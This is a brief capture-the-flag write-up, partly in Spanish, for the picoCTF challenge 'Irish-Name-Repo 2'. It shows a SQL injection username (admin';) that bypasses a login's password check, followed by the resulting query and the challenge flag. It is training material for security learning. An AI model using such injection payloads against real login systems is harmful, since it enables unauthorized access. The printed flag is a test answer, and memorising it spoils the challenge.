# Irish-Name-Repo 2


## Descripcion
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

## Pistas
The password is being filtered
## Solucion
se realiza una inyeccion sql poniendo admin'; como nombre de usuario
username: admin';
password: ssss
SQL query: SELECT * FROM users WHERE name='admin';' AND password='ssss'

Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}
## Bandera
picoCTF{m0R3_SQL_plz_fa983901}
## Notas adicionales


## Referencias
https://www.w3schools.com/sql/sql_injection.asp